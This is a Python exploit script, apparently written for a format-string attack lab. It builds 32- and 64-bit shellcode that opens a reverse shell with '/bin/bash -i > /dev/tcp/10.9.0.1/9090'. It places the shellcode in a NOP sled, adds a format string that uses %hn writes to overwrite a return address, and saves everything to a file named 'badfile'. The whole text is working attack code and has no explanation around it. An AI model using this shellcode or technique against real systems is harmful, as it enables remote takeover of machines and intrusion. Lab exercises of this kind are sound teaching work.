#!/usr/bin/python3
import sys

# 32-bit Generic Shellcode
shellcode_32 = (
   "\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b"
   "\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54"
   "\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff"
   "/bin/bash*"
   "-c*"
   # The * in this line serves as the position marker         *
   "/bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1           *"
   "AAAA"   # Placeholder for argv[0] --> "/bin/bash"
   "BBBB"   # Placeholder for argv[1] --> "-c"
   "CCCC"   # Placeholder for argv[2] --> the command string
   "DDDD"   # Placeholder for argv[3] --> NULL
).encode('latin-1')


# 64-bit Generic Shellcode
shellcode_64 = (
   "\xeb\x36\x5b\x48\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x48"
   "\x89\x5b\x48\x48\x8d\x4b\x0a\x48\x89\x4b\x50\x48\x8d\x4b\x0d\x48"
   "\x89\x4b\x58\x48\x89\x43\x60\x48\x89\xdf\x48\x8d\x73\x48\x48\x31"
   "\xd2\x48\x31\xc0\xb0\x3b\x0f\x05\xe8\xc5\xff\xff\xff"
   "/bin/bash*"
   "-c*"
   # The * in this line serves as the position marker         *
   "/bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1           *"
   "AAAAAAAA"   # Placeholder for argv[0] --> "/bin/bash"
   "BBBBBBBB"   # Placeholder for argv[1] --> "-c"
   "CCCCCCCC"   # Placeholder for argv[2] --> the command string
   "DDDDDDDD"   # Placeholder for argv[3] --> NULL
).encode('latin-1')

N = 1500
# Fill the content with NOP's
content = bytearray(0x90 for i in range(N))

# Choose the shellcode version based on your target
shellcode = shellcode_64

# Put the shellcode somewhere in the payload
start = 8              # Change this number
content[start:start + len(shellcode)] = shellcode

############################################################

s = "%74$.57662lx\n" + "%74$hn\n" + "%75$.7629lx\n" + "%75$hn\n" +"%76$.32766lx\n" + "%76$hn\n" +"%77$.32767lx\n" + "%77$hn\n"
fmt  = (s).encode('latin-1')
print(len(fmt)+len(shellcode))
offset=320-len(fmt)
content[offset:offset+len(fmt)] = fmt

number  =  0x00007fffffffe178 # 0x0000555555558010
content[offset+len(fmt):offset+len(fmt)+8]  =  (number).to_bytes(8,byteorder='little')
number2 = number + 2
content[offset+len(fmt)+8:offset+len(fmt)+16]  =  (number2).to_bytes(8,byteorder='little')
number3 = number2 + 2
content[offset+len(fmt)+16:offset+len(fmt)+24]  =  (number3).to_bytes(8,byteorder='little')
number4 = number3 + 2
content[offset+len(fmt)+24:offset+len(fmt)+32]  =  (number4).to_bytes(8,byteorder='little')

############################################################

# Save the format string to file
with open('badfile', 'wb') as f:
  f.write(content)